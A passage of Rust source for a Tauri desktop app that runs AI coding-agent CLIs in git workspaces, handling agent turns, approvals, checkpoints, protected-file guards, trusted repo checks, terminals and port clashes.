    let rel = format!(".nekotrail/attachments/{}-{}", chrono::Local::now().format("%H%M%S"), safe);
    let full = root.join(&rel);
    std::fs::create_dir_all(full.parent().unwrap()).map_err(e)?;
    std::fs::write(&full, bytes).map_err(e)?;
    Ok(rel)
}

/// Preview tab: is the dev server at `url` up, and does it allow being shown in a frame?
/// Local addresses only; anything else is refused.
#[tauri::command]
async fn preview_probe(url: String) -> Res<preview::Probe> {
    tauri::async_runtime::spawn_blocking(move || preview::probe(&url)).await.map_err(e)?
}

/// Annotate: a PNG of the app window's web view as it looks right now (the UI crops it to the preview).
#[tauri::command]
async fn preview_snapshot(webview: tauri::Webview) -> Res<tauri::ipc::Response> {
    Ok(tauri::ipc::Response::new(preview::snapshot_png(webview).await?))
}

fn emit_event(app: &AppHandle, session_id: &str, ev: &Value) {
    let _ = app.emit("agent", json!({"session_id": session_id, "event": ev}));
}

/// Rename a fresh workspace's branch after its first task, while nothing has been pushed:
/// `me/mochi` becomes `me/fix-502-after-deploy`, which reads better in PRs.
/// What the user can do about an agent error: "install", "login" or "limit". The UI shows the fix.
fn classify_error(text: &str) -> Option<&'static str> {
    let t = text.to_lowercase();
    if t.contains("no such file or directory") || t.contains("command not found") || t.contains("not found in path") {
        Some("install")
    } else if t.contains("/login") || t.contains("not logged in") || t.contains("invalid api key") || t.contains("authentication") || t.contains("unauthorized") || t.contains("401")
        // Gemini CLI with no sign-in: "Please set an Auth method in your ~/.gemini/settings.json ..."
        || t.contains("set an auth method") {
        Some("login")
    } else if t.contains("usage limit") || t.contains("rate limit") || t.contains("limit reached") || t.contains("quota")
        // Gemini's server: "You have exhausted your capacity on this model." / RESOURCE_EXHAUSTED.
        || t.contains("exhausted your capacity") || t.contains("resource_exhausted") {
        Some("limit")
    } else {
        None
    }
}

/// The CLI's own login / limit notices, which arrive as a short assistant message. Strict on purpose:
/// an ordinary reply that mentions "401" must not be flagged.
fn classify_cli_notice(text: &str) -> Option<&'static str> {
    let t = text.to_lowercase();
    if t.contains("please run /login") || t.starts_with("invalid api key") || t.contains("not logged in") {
        Some("login")
    } else if t.contains("usage limit reached") || t.contains("you've hit your limit") || t.contains("limit will reset") {
        Some("limit")
    } else {
        None
    }
}

/// Is a tool installed, and what does it say about itself? Used by the first-run setup check.
fn probe(cmd: &str, args: &[&str]) -> (bool, String) {
    match Command::new(cmd).args(args).stdin(Stdio::null()).output() {
        Ok(o) => {
            let out = format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr));
            (o.status.success(), out.lines().next().unwrap_or("").trim().to_string())
        }
        Err(_) => (false, String::new()),
    }
}

/// The agents whose CLI is on PATH, found without running anything, so the agent pickers can
/// list them first and fold the rest under "More agents".
#[tauri::command]
fn installed_agents() -> Vec<&'static str> {
    let path = std::env::var_os("PATH").unwrap_or_default();
    let dirs: Vec<PathBuf> = std::env::split_paths(&path).collect();
    agent::ALL.iter().filter(|a| on_path(&dirs, a.bin())).map(|a| a.id()).collect()
}

/// An executable file called `bin` in one of `dirs`.
fn on_path(dirs: &[PathBuf], bin: &str) -> bool {
    use std::os::unix::fs::PermissionsExt;
    dirs.iter().any(|d| std::fs::metadata(d.join(bin)).is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o111 != 0))
}

/// First-run check: git, GitHub CLI login, and the agent CLIs.
#[tauri::command]
async fn doctor() -> Res<Value> {
    // About a second of subprocesses (two of them `gh` network calls): keep it off the async workers.
    tauri::async_runtime::spawn_blocking(doctor_blocking).await.map_err(e)
}

fn doctor_blocking() -> Value {
    let (git_ok, git_v) = probe("git", &["--version"]);
    let (gh_installed, _) = probe("gh", &["--version"]);
    let (gh_ok, _) = probe("gh", &["auth", "status"]);
    let login = if gh_ok { github_login() } else { None };
    let mut out = json!({
        "git": {"ok": git_ok, "version": git_v},
        "gh": {"installed": gh_installed, "ok": gh_ok, "login": login},
    });
    // One entry per agent CLI, keyed by its id. A missing one is ok: false with no version.
    // Sixteen CLIs, some of them Node start-ups: ask them all at once.
    let found: Vec<(&str, (bool, String))> = std::thread::scope(|s| {
        let jobs: Vec<_> = agent::ALL.iter().map(|a| (a.id(), s.spawn(move || { let (bin, args) = a.probe(); probe(bin, args) }))).collect();
        jobs.into_iter().map(|(id, j)| (id, j.join().unwrap_or((false, String::new())))).collect()
    });
    for (id, (ok, version)) in found {
        out[id] = json!({"ok": ok, "version": version});
    }
    out
}

fn maybe_name_branch(app: &AppHandle, st: &AppState, ws: Workspace, text: &str) -> Workspace {
    let placeholder = format!("{}/{}", st.branch_prefix(), ws.name);
    if ws.branch != placeholder || ws.imported_from.is_some() || st.db().setting("auto_branch").ok().flatten().as_deref() == Some("off") {
        return ws;
    }
    let slug = branch_slug(text);
    if slug.len() < 3 {
        return ws;
    }
    let dir = Path::new(&ws.path);
    let mut name = format!("{}/{slug}", st.branch_prefix());
    let mut n = 2;
    while git::branch_exists(dir, &name) {
        name = format!("{}/{slug}-{n}", st.branch_prefix());
        n += 1;
    }
    let pushed = git::git(dir, &["rev-parse", "--verify", "--quiet", &format!("refs/remotes/origin/{}", ws.branch)]).is_ok();
    if pushed || git::git(dir, &["branch", "-m", &ws.branch, &name]).is_err() {
        return ws;
    }
    let _ = st.db().set_branch(&ws.id, &name);
    let _ = app.emit("workspaces-changed", json!({}));
    Workspace { branch: name, ..ws }
}

fn start_turn(app: AppHandle, st: &AppState, id: String, text: String) -> Res<()> {
    let (session, ws, repo) = {
        let db = st.db();
        let s = db.session(&id).map_err(e)?;
        let ws = db.workspace(&s.workspace_id).map_err(e)?;
        let repo = db.repo(&ws.repo_id).map_err(e)?;
        if s.title == "New chat" {
            let t: String = text.lines().next().unwrap_or("").chars().take(48).collect();
            db.update_session_settings(&id, if t.is_empty() { "New chat" } else { &t }, s.model.as_deref(), &s.permission_mode).map_err(e)?;
        }
        (s, ws, repo)
    };
    let env = env_for(st, &repo, &ws);
    let prefs = &repo.prefs;
    let dirs = st.db().extra_dirs(&id).unwrap_or_default();
    let ws = maybe_name_branch(&app, st, ws, &text);
    // Name the workspace after its task, so 20 workspaces stay readable. Only while it has no
    // title: a PR title or one the user typed is never replaced (see title.rs).
    if ws.title.is_empty() {
        let t = title::task_title(&text);
        if !t.is_empty() && st.db().set_title(&ws.id, &t, title::AUTO).unwrap_or(false) {
            let _ = app.emit("workspaces-changed", json!({}));
        }
    }
    if st.runs.lock().unwrap().rewinding.contains(&ws.id) {
        return Err("Files are being rewound in this workspace. Send again in a moment.".into());
    }
    // Snapshot the worktree first, so this turn can be undone with one click.
    let prefix = git::checkpoint_prefix(&ws.id);
    let checkpoint = git::checkpoint(Path::new(&ws.path), &prefix).ok();
    // Keep the newest 50, without making the turn wait for it.
    let ws_path = ws.path.clone();
    std::thread::spawn(move || git::prune_checkpoints(Path::new(&ws_path), &prefix, git::CHECKPOINT_KEEP));
    // Protected paths: checkpoints skip ignored files like .env, so save the protected ones too.
    // The list is read now, so an agent editing nekotrail.json can't change this turn's check.
    let rules = guard_rules(&repo, &ws);
    let guarded = !rules.is_empty();
    let guard_base = guard::Base {
        checkpoint: checkpoint.clone(),
        ignored: if guarded {
            let gp = guard::prefix(&ws.id);
            let saved = guard::snapshot_ignored(Path::new(&ws.path), &gp, &rules).ok();
            let p = ws.path.clone();
            std::thread::spawn(move || git::prune_checkpoints(Path::new(&p), &gp, git::CHECKPOINT_KEEP));
            saved
        } else {
            None
        },
    };
    let user = json!({"kind": "user", "text": text, "checkpoint": checkpoint});
    st.db().append_event(&id, &user).map_err(e)?;
    emit_event(&app, &id, &user);
    let prompt = match st.runs.lock().unwrap().notes.remove(&id) {
        Some(note) => format!("{note}\n\n{text}"),
        None => text.clone(),
    };

    let fork = st.runs.lock().unwrap().forks.remove(&id);
    // Every chat in a review workspace reads only, whatever mode it was started in.
    let permission_mode = if ws.review_pr > 0 { "plan" } else { session.permission_mode.as_str() };
    // Checked on every turn, right before it starts, so a pull or the agent itself editing these
    // files can't slip new commands in after the user trusted the old ones.
    let harness = agent::get(&session.agent);
    let project_config = untrusted_agent_config(st, &ws, harness).is_none();
    if !project_config
        && let Some(why) = harness.needs_trusted_config() {
            let ev = json!({"kind": "error", "text": why});
            st.db().append_event(&id, &ev).map_err(e)?;
            emit_event(&app, &id, &ev);
            return Ok(());
        }
    if !project_config && session.agent_session_id.is_none() {
        let note = json!({"kind": "note", "text": "This repo's own agent settings (hooks, MCP servers, env) are off for this chat until you trust them."});
        st.db().append_event(&id, &note).map_err(e)?;
        emit_event(&app, &id, &note);
    }
    let spec = agent::TurnSpec {
        project_config,
        fork,
        agent: &session.agent,
        prompt: &prompt,
        agent_session_id: session.agent_session_id.as_deref(),
        model: session.model.as_deref(),
        permission_mode,
        cwd: Path::new(&ws.path),
        effort: session.effort.as_deref(),
        instructions: Some(prefs.general_prompt.trim()).filter(|p| !p.is_empty()),
        env: &env,
        dirs: &dirs,
        guard: Some(&rules),
    };
    let mut cmd = agent::command(&spec);
    let parser: SharedParser = Arc::new(Mutex::new(agent::parser(&spec)));
    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(err) => {
            let ev = json!({"kind": "error", "text": format!("Couldn't start {}: {err}", session.agent), "fix": "install", "agent": session.agent});
            st.db().append_event(&id, &ev).map_err(e)?;
            emit_event(&app, &id, &ev);
            return Ok(());
        }
    };
    {
        let mut runs = st.runs.lock().unwrap();
        runs.running.insert(id.clone(), child.id());
        runs.parsers.insert(id.clone(), parser.clone());
    }
    if harness.interactive(permission_mode)
        && let Some(mut stdin) = child.stdin.take() {
            use std::io::Write;
            if let Some(first) = harness.first_input(&prompt) {
                let _ = stdin.write_all(first.as_bytes());
                let _ = stdin.flush();
            }
            st.runs.lock().unwrap().stdins.insert(id.clone(), stdin);
            // ACP: `initialize` goes first.
            let first = parser.lock().unwrap().outgoing();
            write_stdin(&st.runs, &id, &first);
        }
    // Keep the Mac awake while the agent works (ends by itself when the agent exits).
    #[cfg(target_os = "macos")]
    if st.db().setting("caffeinate").ok().flatten().as_deref() != Some("off") {
        let _ = Command::new("caffeinate").args(["-i", "-w", &child.id().to_string()]).stdout(Stdio::null()).stderr(Stdio::null()).spawn();
    }
    // Linux: the same through systemd-inhibit, where there is one.
    #[cfg(not(target_os = "macos"))]
    if st.db().setting("caffeinate").ok().flatten().as_deref() != Some("off") {
        linux::keep_awake_while(child.id());
    }
    let _ = app.emit("running", json!({"session_id": id, "running": true, "workspace_id": ws.id}));

    let stdout = child.stdout.take().unwrap();
    let stderr = child.stderr.take().unwrap();
    let err_buf = Arc::new(Mutex::new(String::new()));
    let err_buf2 = err_buf.clone();
    std::thread::spawn(move || {
        for line in BufReader::new(stderr).lines().map_while(Result::ok) {
            let mut b = err_buf2.lock().unwrap();
            if b.len() < 8000 {
                b.push_str(&line);
                b.push('\n');
            }
        }
    });

    let agent_name = session.agent.clone();
    let workspace_id = ws.id.clone();
    let ws_dir = ws.path.clone();
    let pid = child.id();
    let reviewing = ws.review_pr > 0;
    std::thread::spawn(move || {
        let st = app.state::<AppState>();
        // In a review workspace, what the agent wrote this turn: its findings become draft comments.
        let mut said = String::new();
        let mut saw_done = false;
        let mut ok = true;
        let mut context_tokens: Option<u64> = None;
        // Why the user is needed when this turn ends, if they are: plan, question, login, limit, install, error.
        let mut needs: Option<String> = None;
        let mut user_stopped = false;
        // The `None` after the last line lets the parser hand over anything it still holds.
        let lines = BufReader::new(stdout).lines().map_while(Result::ok).map(Some).chain(std::iter::once(None));
        for line in lines {
            let end = line.is_none();
            let line = line.unwrap_or_default();
            // Interactive turns: permission requests and the end of the turn arrive here first.
            if (line.contains("\"control_request\"") || line.contains("\"type\":\"result\""))
                && let Ok(j) = serde_json::from_str::<Value>(&line) {
                    if j["type"] == "control_request" && j["request"]["subtype"] == "can_use_tool" {
                        let req = &j["request"];
                        let rid = j["request_id"].as_str().unwrap_or("").to_string();
                        let tool = req["tool_name"].as_str().unwrap_or("tool").to_string();
                        st.runs.lock().unwrap().approvals.insert(rid.clone(), (id.clone(), req["input"].clone(), req["permission_suggestions"].clone()));
                        let ev = json!({
                            "kind": "approval", "request_id": rid, "tool": tool,
                            "input": agent::summarize_input(&tool, &req["input"]),
                            "description": req["description"], "can_always": req["permission_suggestions"].is_array(),
                        });
                        let _ = st.db().append_event(&id, &ev);
                        emit_event(&app, &id, &ev);
                        let _ = app.emit("needs", json!({"workspace_id": workspace_id, "session_id": id, "needs": "approval", "title": format!("{tool}: {}", ev["input"].as_str().unwrap_or(""))}));
                        continue;
                    }
                    if j["type"] == "result" {
                        // The turn is over: close stdin so the CLI exits.
                        st.runs.lock().unwrap().stdins.remove(&id);
                    }
            }
            let (events, reply, answered) = {
                let mut p = parser.lock().unwrap();
                let events = if end { p.finish() } else { p.line(&line) };
                (events, p.outgoing(), p.finished())
            };
            write_stdin(&st.runs, &id, &reply);
            // An ACP turn has its answer: close stdin so the agent exits, and make sure it does.
            if answered && st.runs.lock().unwrap().stdins.remove(&id).is_some() {
                signal_later(st.runs.clone(), id.clone(), pid, 5, "-TERM");
            }
            for mut ev in events {
                if ev["kind"] == "approval" {
                    // Raised by the parser (ACP): answered through it, see `answer_approval`.
                    if let Some(rid) = ev["request_id"].as_str() {
                        st.runs.lock().unwrap().approvals.insert(rid.to_string(), (id.clone(), Value::Null, Value::Null));
                    }
                    let _ = st.db().append_event(&id, &ev);
                    emit_event(&app, &id, &ev);
                    let _ = app.emit("needs", json!({"workspace_id": workspace_id, "session_id": id, "needs": "approval", "title": format!("{}: {}", ev["tool"].as_str().unwrap_or("tool"), ev["input"].as_str().unwrap_or(""))}));
                    continue;
                }
                if ev["kind"] == "usage" {
                    context_tokens = ev["context_tokens"].as_u64();
                    let _ = app.emit("usage", json!({"session_id": id, "context_tokens": context_tokens}));
                    continue;
                }
                if ev["kind"] == "done" && context_tokens.is_some() {
                    ev["context_tokens"] = json!(context_tokens);
                }
                if ev["kind"] == "session" {
                    if let Some(sid) = ev["agent_session_id"].as_str() {
                        let _ = st.db().set_agent_session_id(&id, sid);
                    }
                    continue;
                }
                if ev["kind"] == "done" {
                    saw_done = true;
                    if let Some(c) = ev["cost_usd"].as_f64() {
                        let _ = st.db().record_cost(&id, c);
                    }
                    ok = !ev["is_error"].as_bool().unwrap_or(false);
                    // Agents that report the interrupt themselves (Gemini) mark it, so it reads as a stop.
                    if ev["stopped"] == true {
                        user_stopped = true;
                    }
                }
                // Login and usage-limit problems arrive as ordinary text; tag them so the UI offers the fix.
                let fix = match ev["kind"].as_str() {
                    Some("error") => ev["text"].as_str().and_then(classify_error),
                    Some("text") => ev["text"].as_str().filter(|t| t.len() < 300).and_then(classify_cli_notice),
                    _ => None,
                };
                if let Some(fix) = fix {
                    ev["fix"] = json!(fix);
                    ev["agent"] = json!(agent_name);
                    needs = Some(fix.to_string());
                }
                match (ev["kind"].as_str(), ev["name"].as_str()) {
                    (Some("tool"), Some("ExitPlanMode")) => needs = Some("plan".into()),
                    (Some("tool"), Some("AskUserQuestion")) => needs = Some("question".into()),
                    (Some("text"), _) if needs.as_deref() == Some("plan") || needs.as_deref() == Some("question") => {}
                    (Some("tool"), _) => { if matches!(needs.as_deref(), Some("plan") | Some("question")) { needs = None; } }
                    _ => {}
                }
                if reviewing && ev["kind"] == "text" && said.len() < 400_000
                    && let Some(t) = ev["text"].as_str() {
                        said.push_str(t);
                        said.push('\n');
                    }
                let _ = st.db().append_event(&id, &ev);
                emit_event(&app, &id, &ev);
            }
        }
        let status = child.wait();
        if !saw_done {
            let stderr = err_buf.lock().unwrap().trim().to_string();
            let stopped = harness.stopped_by_user(status.as_ref().ok(), &stderr);
            let ev = if stopped {
                json!({"kind": "done", "is_error": true, "stopped": true})
            } else {
                json!({"kind": "error", "fix": classify_error(&stderr), "agent": agent_name,
                       "text": if stderr.is_empty() { "The agent stopped without a reply. Send your message again.".to_string() } else { stderr }})
            };
            ok = false;
            user_stopped = stopped;
            if !stopped && needs.is_none() {
                needs = Some(classify_error(ev["text"].as_str().unwrap_or("")).unwrap_or("error").to_string());
            }
            let _ = st.db().append_event(&id, &ev);
            emit_event(&app, &id, &ev);
        }
        // Every agent, whatever it enforces itself: did this turn change a protected file?
        let mut guard_hit: Option<String> = None;
        if guarded
            && let Ok(hits) = guard::check(Path::new(&ws_dir), &rules, &guard_base)
            && !hits.is_empty() {
                let ev = json!({"kind": "guard", "files": hits, "checkpoint": guard_base.checkpoint, "ignored": guard_base.ignored, "level": harness.guard_level()});
                let _ = st.db().append_event(&id, &ev);
                emit_event(&app, &id, &ev);
                let names: Vec<&str> = hits.iter().map(|h| h.path.as_str()).collect();
                guard_hit = Some(format!("Changed a protected file: {}", names.join(", ")));
            }
        if reviewing && !said.is_empty() {
            review_findings_in(&app, &st, &workspace_id, &said);
        }
        let _ = st.db().set_unread(&workspace_id, true);
        mark_changed(&st, &workspace_id);
        let next = {
            let mut runs = st.runs.lock().unwrap();
            runs.running.remove(&id);
            runs.stdins.remove(&id);
            runs.parsers.remove(&id);
            runs.approvals.retain(|_, (sid, _, _)| sid != &id);
            let next = runs.queued.get_mut(&id).and_then(|q| q.pop_front());
            let rest: Vec<String> = runs.queued.get(&id).map(|q| q.iter().cloned().collect()).unwrap_or_default();
            let _ = app.emit("queue", json!({"session_id": id, "queued": rest}));
            next
        };
        let title = guard_hit.clone().unwrap_or_else(|| st.db().session(&id).map(|s| s.title).unwrap_or_default());
        // A turn that ended well, with nothing queued and nothing to ask: run the checks if the repo wants that.
        let run_checks = ok && !user_stopped && guard_hit.is_none() && needs.is_none() && next.is_none()
            && st.db().workspace(&workspace_id).and_then(|w| st.db().repo(&w.repo_id)).is_ok_and(|r| r.prefs.checks_after_turn);
        let _ = app.emit("running", json!({
            "session_id": id, "running": false, "workspace_id": workspace_id,
            "ok": ok, "title": title, "more_queued": next.is_some(),
            "needs": if guard_hit.is_some() { Some("protected".to_string()) } else if next.is_some() || user_stopped { None } else if !ok && needs.is_none() { Some("error".to_string()) } else { needs },
        }));
        if let Some(text) = next {
            let _ = start_turn(app.clone(), &st, id, text);
        } else if run_checks {
            let _ = start_checks(&app, &st, &workspace_id, None, Some(id));
        }
    });
    Ok(())
}

// ---------- checks ----------

/// A workspace's checks that can run, and its `nekotrail.json` checks with their fingerprint
/// when the user hasn't approved those exact commands yet (they don't run until then).
type Untrusted = Option<(Vec<(String, String)>, String)>;

fn checks_for(st: &AppState, ws: &Workspace, repo: &Repo) -> (Vec<checks::Defined>, Untrusted) {
    let file = config::checks_from_file(Path::new(&ws.path));
    let print = config::checks_fingerprint(&file);
    let trusted = file.is_empty() || st.db().setting(&config::trust_key(&ws.repo_id, &print)).ok().flatten().is_some();
    let list = checks::defined(if trusted { &file } else { &[] }, &repo.prefs.actions);
    (list, (!trusted).then_some((file, print)))
}

/// Everything the Checks tab shows: the checks, approval or suggestions, the last results
/// (without their output, see `checks_output`) and the run going now.
#[tauri::command]
async fn checks_list(st: State<'_, AppState>, id: String) -> Res<Value> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let repo = st.db().repo(&ws.repo_id).map_err(e)?;
    let (list, untrusted) = checks_for(&st, &ws, &repo);
    let suggestions = if list.is_empty() && untrusted.is_none() {
        let path = ws.path.clone();
        tauri::async_runtime::spawn_blocking(move || checks::suggest(Path::new(&path))).await.unwrap_or_default()
    } else {
        vec![]
    };
    let results: Vec<Value> = st
        .checks
        .results(&id)
        .into_iter()
        .filter(|r| list.iter().any(|d| d.name == r.name))
        .map(|r| {
            let mut v = json!(r);
            if let Some(o) = v.as_object_mut() {
                o.remove("output");
            }
            v
        })
        .collect();
    let progress = st.checks.progress(&id);
    Ok(json!({
        "checks": list,
        "trust": untrusted.map(|(c, print)| json!({"fingerprint": print, "checks": c})),
        "suggestions": suggestions,
        "after_turn": repo.prefs.checks_after_turn,
        "results": results,
        "active": progress.is_some(),
        "current": progress.as_ref().and_then(|p| p.0.clone()),
        "queued": progress.map(|p| p.1).unwrap_or_default(),
    }))
}

/// What one check printed the last time it ran.
#[tauri::command]
async fn checks_output(st: State<'_, AppState>, id: String, name: String) -> Res<String> {
    Ok(st.checks.result(&id, &name).map(|r| r.output).unwrap_or_default())
}

/// Run the workspace's checks (all, or the ones named) in the background. `checks` events report
/// progress; results land in `checks_list`.
#[tauri::command]
async fn checks_run(app: AppHandle, st: State<'_, AppState>, id: String, names: Option<Vec<String>>) -> Res<()> {
    start_checks(&app, &st, &id, names, None)
}

#[tauri::command]
async fn checks_stop(st: State<'_, AppState>, id: String) -> Res<()> {
    st.checks.stop(&id);
    Ok(())
}

/// The user approved the repo file's checks they were shown, for this repo, until they change.
#[tauri::command]
async fn checks_trust(st: State<'_, AppState>, id: String, fingerprint: String) -> Res<()> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let file = config::checks_from_file(Path::new(&ws.path));
    if file.is_empty() || config::checks_fingerprint(&file) != fingerprint {
        return Err("nekotrail.json changed since you looked at it. Check the commands again.".into());
    }
    st.db().set_setting(&config::trust_key(&ws.repo_id, &fingerprint), &store::now()).map_err(e)
}

/// Each workspace's dot: "running", "failed" or "passed" (missing before the first run).
#[tauri::command]
async fn checks_statuses(st: State<'_, AppState>) -> Res<HashMap<String, String>> {
    Ok(st.checks.statuses())
}

/// Start a run. `turn` is the chat whose turn just ended: the result goes into that chat, and a
/// check that passed before and fails now moves the workspace to Needs you.
fn start_checks(app: &AppHandle, st: &AppState, ws_id: &str, names: Option<Vec<String>>, turn: Option<String>) -> Res<()> {
    let ws = st.db().workspace(ws_id).map_err(e)?;
    let repo = st.db().repo(&ws.repo_id).map_err(e)?;
    let (list, _) = checks_for(st, &ws, &repo);
    st.checks.retain(ws_id, &list.iter().map(|d| d.name.clone()).collect::<Vec<_>>());
    let chosen: Vec<checks::Defined> = list.into_iter().filter(|d| names.as_ref().is_none_or(|n| n.contains(&d.name))).collect();
    if chosen.is_empty() {
        return Err("This repo has no checks to run yet. Add them in the Checks tab.".into());
    }
    let order: Vec<String> = chosen.iter().map(|d| d.name.clone()).collect();
    let stop = st.checks.begin(ws_id, &order).ok_or("Checks are already running in this workspace.")?;
    let env = env_for(st, &repo, &ws);
    let (app, ws_id, root) = (app.clone(), ws_id.to_string(), PathBuf::from(&ws.path));
    let trigger = if turn.is_some() { "turn" } else { "manual" };
    let _ = app.emit("checks", json!({"workspace_id": ws_id, "state": "running", "trigger": trigger}));
    std::thread::spawn(move || {
        let st = app.state::<AppState>();
        let mut done: Vec<checks::CheckResult> = vec![];
        for d in chosen {
            if stop.load(std::sync::atomic::Ordering::Relaxed) {
                break;
            }
            st.checks.starting(&ws_id, &d.name);
            let _ = app.emit("checks", json!({"workspace_id": ws_id, "state": "running", "trigger": trigger}));
            let prev = st.checks.result(&ws_id, &d.name);
            let ex = checks::exec(&d.command, &root, &env, &stop, checks::TIMEOUT, |_| {});
            if ex.stopped {
                break; // Stop keeps the last result rather than a half run.
            }
            let parsed = checks::read_results(&root, &d.command, &ex);
            let r = checks::outcome(&d.name, &d.command, &ex, parsed, prev.as_ref(), checks::TIMEOUT);
            st.checks.put(&ws_id, r.clone());
            done.push(r);
        }
        st.checks.end(&ws_id);
        let stopped = stop.load(std::sync::atomic::Ordering::Relaxed);
        let regressed = checks::regressions(&done);
        let _ = app.emit("checks", json!({"workspace_id": ws_id, "state": "done", "trigger": trigger, "stopped": stopped, "regressed": regressed}));
        let Some(session) = turn else { return };
        if stopped || done.is_empty() {
            return;
        }
        let ev = json!({"kind": "checks", "results": done.iter().map(|r| json!({
            "name": r.name, "status": r.status, "passed": r.passed, "failed": r.failed, "regressed": r.regressed,
        })).collect::<Vec<_>>()});
        let _ = st.db().append_event(&session, &ev);
        emit_event(&app, &session, &ev);
        if !regressed.is_empty() {
            let _ = st.db().set_unread(&ws_id, true);
            let title = format!("{} passed before and {} now", regressed.join(" and "), if regressed.len() == 1 { "fails" } else { "fail" });
            let _ = app.emit("needs", json!({"workspace_id": ws_id, "session_id": session, "needs": "checks", "title": title}));
            let _ = app.emit("workspaces-changed", json!({}));
        }
    });
    Ok(())
}

// ---------- terminals ----------

#[tauri::command]
async fn pty_open(app: AppHandle, st: State<'_, AppState>, id: String, cwd: String, cols: u16, rows: u16) -> Res<String> {
    // Already running (e.g. the view was rebuilt): hand back what it printed so far.
    if let Some(sb) = st.ptys.scrollback(&id) {
        return Ok(sb);
    }
    start_pty(&app, &st, &id, &cwd, None, cols, rows)?;
    Ok(String::new())
}

/// Run a workspace's setup or run script in its own terminal (`<workspace id>:<script>`), replacing
/// any earlier run. The command is looked up here, not taken from the web view, so a repo's
/// `nekotrail.json` only runs once the user approved it. The terminal ends when the command does;
/// `pty-exit` reports it.
#[tauri::command]
async fn pty_run(app: AppHandle, st: State<'_, AppState>, id: String, script: String, cols: u16, rows: u16) -> Res<()> {
    let ws_id = id.split(':').next().unwrap_or_default();
    let ws = st.db().workspace(ws_id).map_err(e)?;
    if script == "archive" {
        return Err("The archive script runs when you archive the workspace.".into());
    }
    let cmd = script_to_run(&st, &ws, &script)?.ok_or(format!("This repo has no {script} script yet. Add one in its settings."))?;
    start_pty(&app, &st, &id, &ws.path, Some(&cmd), cols, rows)
}

/// Output of a running terminal without starting one; null when it isn't running.
#[tauri::command]
async fn pty_attach(st: State<'_, AppState>, id: String) -> Res<Option<String>> {
    Ok(st.ptys.scrollback(&id))
}

#[allow(clippy::too_many_arguments)]
fn start_pty(app: &AppHandle, st: &AppState, id: &str, cwd: &str, cmd: Option<&str>, cols: u16, rows: u16) -> Res<()> {
    // Terminals get the workspace's environment (ports, repo variables).
    let env = id
        .split(':')
        .next()
        .and_then(|ws_id| st.db().workspace(ws_id).ok())
        .and_then(|w| st.db().repo(&w.repo_id).ok().map(|r| env_for(st, &r, &w)))
        .unwrap_or_default();
    let (a1, a2, id1, id2) = (app.clone(), app.clone(), id.to_string(), id.to_string());
    // The Run script: watch its output for "address already in use", the sign of a dev server that
    // ignored PORT and tried a default another workspace already holds.
    let run_of = id.strip_suffix(":run").map(str::to_string);
    if let Some(ws_id) = &run_of {
        st.port_failures.lock().unwrap().remove(ws_id);
    }
    let tail = Mutex::new(String::new());
    st.ptys
        .open(
            id,
            cwd,
            &env,
            cmd,
            cols,
            rows,
            move |data| {
                if let Some(ws_id) = &run_of {
                    // Keep a little of the last chunk, so an error split across two reads still matches.
                    let mut t = tail.lock().unwrap();
                    t.push_str(&data);
                    if let Some(port) = ports::in_use_error(&t) {
                        t.clear();
                        port_failed(&a1, ws_id, port);
                    } else if t.len() > 512 {
                        let mut cut = t.len() - 256;
                        while !t.is_char_boundary(cut) {
                            cut += 1;
                        }
                        t.drain(..cut);
                    }
                }
                let _ = a1.emit("pty", json!({"id": id1, "data": data}));
            },
            move |generation| {
                let st = a2.state::<AppState>();
                st.ptys.close_if(&id2, generation);
                let _ = a2.emit("pty-exit", json!({"id": id2}));
            },
        )
        .map(|_| ())
        .map_err(e)
}

/// The Run script said its port was taken. Remember it for the Ports popover, and tell the window
/// once, with who holds the port and the fix (lsof runs off the terminal's reader thread).
fn port_failed(app: &AppHandle, ws_id: &str, port: Option<u16>) {
    let st = app.state::<AppState>();
    if st.port_failures.lock().unwrap().insert(ws_id.to_string(), port) == Some(port) {
        return;
    }
    let (app, ws_id) = (app.clone(), ws_id.to_string());
    std::thread::spawn(move || {
        let st = app.state::<AppState>();
        if let Some(p) = ports_report(&st, Some(&ws_id)).into_iter().next()
            && let Some(problem) = p.problems.into_iter().rfind(|x| x.port == port) {
                let _ = app.emit("port-clash", json!({"workspace_id": ws_id, "text": problem.text, "fix": problem.fix}));
            }
    });
}

/// Every process a workspace started and still runs, by workspace: its terminals and scripts,
/// and its agent turns. Anything descending from these is that workspace's.
fn workspace_roots(st: &AppState) -> HashMap<String, Vec<u32>> {
    let mut roots: HashMap<String, Vec<u32>> = HashMap::new();
    for (id, pid) in st.ptys.pids() {
        if let Some(ws) = id.split(':').next() {
            roots.entry(ws.to_string()).or_default().push(pid);
        }
    }
    let running: Vec<(String, u32)> = st.runs.lock().unwrap().running.iter().map(|(k, v)| (k.clone(), *v)).collect();
    let db = st.db();
    for (session, pid) in running {
        if let Ok(s) = db.session(&session) {
            roots.entry(s.workspace_id).or_default().push(pid);
        }
    }
    roots
}

/// The Ports popover's data for every active workspace, or just `only`.
fn ports_report(st: &AppState, only: Option<&str>) -> Vec<ports::WsPorts> {
    let (list, repos) = {
        let db = st.db();
        (db.workspaces(false).unwrap_or_default(), db.repos().unwrap_or_default())
    };
    let titles = |w: &Workspace| if w.title.trim().is_empty() { w.name.clone() } else { format!("\"{}\"", w.title.trim()) };
    let failures = st.port_failures.lock().unwrap().clone();
    let mut infos = vec![];
    for w in &list {
        let Some(repo) = repos.iter().find(|r| r.id == w.repo_id) else { continue };
        // Only the one asked about may be handed a block here; the others show what they hold.
        let base = if only.is_none_or(|o| o == w.id) { port_block(st, w) } else { st.db().port_block(&w.id).ok().flatten() };
        let Some(base) = base else { continue };
        let names = config::port_names_from_file(Path::new(&w.path));
        let run = scripts_for(st, w).ok().and_then(|s| s.run).map(|r| ports::resolve_run(&r, Path::new(&w.path))).unwrap_or_default();
        infos.push(ports::WsInfo {
            id: w.id.clone(),
            label: titles(w),
            base,
            env: port_env(repo, w, base),
            names,
            run,
            failed: failures.get(&w.id).copied(),
        });
    }
    let listeners = ports::listeners();
    let roots = workspace_roots(st);
    let parents = ports::parents();
    let cwds = ports::cwds(&listeners.iter().map(|l| l.pid).collect::<Vec<_>>());
    let owner = |pid: u32| -> Option<(String, ports::How)> {
        if let Some((id, _)) = roots.iter().find(|(_, r)| ports::in_tree(pid, r, &parents)) {
            return Some((id.clone(), ports::How::Tree));
        }
